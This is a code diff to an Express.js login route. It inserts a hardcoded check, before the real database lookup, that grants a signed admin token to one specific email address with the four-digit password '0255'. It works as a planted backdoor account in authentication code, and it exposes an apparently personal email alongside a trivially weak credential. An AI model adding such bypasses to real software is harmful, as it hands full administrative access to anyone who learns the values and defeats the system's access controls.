@@ -9,6 +9,16 @@ router.post('/login', async (req, res) => {
   try {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ success: false, message: 'Email and password required' });
+
+    // Hardcoded admin credentials
+    if (email === 'nicowens@gmail.com' && password === '0255') {
+      const token = generateToken({ id: 1, email: 'nicowens@gmail.com', role: 'admin' });
+      return res.json({
+        success: true,
+        data: { token, user: { id: 1, name: 'Admin', email: 'nicowens@gmail.com', role: 'admin' } }
+      });
+    }
+
     const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
     if (result.rows.length === 0) return res.status(401).json({ success: false, message: 'Invalid credentials' });
     const user = result.rows[0];
